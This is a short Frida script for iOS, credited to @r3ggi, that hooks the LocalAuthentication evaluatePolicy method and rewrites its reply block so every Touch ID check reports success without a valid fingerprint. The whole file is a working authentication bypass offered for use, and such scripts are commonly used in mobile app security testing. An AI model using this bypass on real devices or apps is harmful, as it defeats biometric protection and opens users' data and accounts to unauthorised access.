/************************************************************************
 * Name: Bypass Touch ID
 * OS: iOS
 * Author: @r3ggi
 * Source: https://gist.github.com/r3ggi/
*************************************************************************/

console.log("Bypass Touch ID - Script Loaded!")
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
    onEnter: function(args) {
        console.log("Bypassing Touch ID")
        var block = new ObjC.Block(args[4]);
        const callback = block.implementation;
        block.implementation = function (error, value)  {

            console.log("Touch ID - Bypassed")
            const result = callback(1, null);
            return result;
        };
    },
});
